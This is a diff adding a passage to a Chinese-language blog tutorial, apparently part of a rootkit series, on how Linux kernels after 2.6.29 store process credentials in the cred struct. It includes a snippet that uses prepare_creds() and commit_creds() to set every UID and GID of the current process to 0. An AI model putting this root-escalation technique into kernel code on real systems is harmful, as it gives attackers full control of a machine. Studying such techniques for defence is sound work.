@@ -41,3 +41,52 @@ tags: [rootkit,kernel]
 
 "current"是一个代表当前进程的task struct的宏.
 
+之前说的是内核版本低于2.6.29的实现方式.高于2.6.29的版本.task_struct这个结构变化了.访问进程的权限的方式也发生改变了.详细的变化可以参考这个[paper](http://www.mjmwired.net/kernel/Documentation/credentials.txt)
+
+新的task_struct结构:
+
+	struct task_struct {
+    ...
+    const struct cred *cred;    /* effective (overridable) subjective task
+    * credentials (COW) */
+    ...
+	};
+
+cred 结构在"linux/cred.h"中定义:
+
+	struct cred {
+	    ...
+	    uid_t       uid;        /* real UID of the task */
+	    gid_t       gid;        /* real GID of the task */
+	    uid_t       suid;       /* saved UID of the task */
+	    gid_t       sgid;       /* saved GID of the task */
+	    uid_t       euid;       /* effective UID of the task */
+	    gid_t       egid;       /* effective GID of the task */
+	    uid_t       fsuid;      /* UID for VFS ops */
+	    gid_t       fsgid;      /* GID for VFS ops */
+	    ...
+
+
+这个结构保存了所有的进程权限控制信息.可以通过一下的方式修改:
+
+	struct cred *new;
+	 
+	new = prepare_creds();
+	 
+	if ( new != NULL ) {
+	 
+	    new->uid = new->gid = 0;
+	    new->euid = new->egid = 0;
+	    new->suid = new->sgid = 0;
+	    new->fsuid = new->fsgid = 0;
+	 
+	    commit_creds(new);
+	}
+
+
+下面解释一下prepare_creds()这个函数:
+
+想要修改当前程序的权限信息,需要先调用一个函数准备好新的权限信息.就是
+
+struct cred *prepare_creds(void);
+
